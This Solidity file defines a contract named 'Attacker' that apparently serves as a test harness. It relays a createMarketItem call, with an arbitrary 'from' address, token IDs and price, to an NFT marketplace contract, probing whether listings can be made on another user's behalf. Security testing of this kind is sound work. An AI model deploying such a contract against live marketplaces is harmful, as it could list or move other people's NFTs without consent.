// SPDX-License-Identifier: MIT
pragma solidity >=0.4.25 <0.9.0;

import "./Ownable.sol";

interface IMarketItemMain {
    function createMarketItem(
        address nftContract,
        address fromAddress,
        address toAddress,
        uint256[] memory tokenIds,
        uint256 price,
        uint256[] memory amounts
    ) external payable;
}

contract Attacker is Ownable {
    IMarketItemMain public immutable marketItemContract;

    constructor(address marketItemContractAddress) {
        marketItemContract = IMarketItemMain(marketItemContractAddress);
    }

    function attack(
        address nftContract,
        address fromAddress,
        address toAddress,
        uint256[] memory tokenIds,
        uint256 price,
        uint256[] memory amounts
    ) external payable onlyOwner {
        marketItemContract.createMarketItem(
            nftContract,
            fromAddress,
            toAddress,
            tokenIds,
            price,
            amounts
        );
    }
}
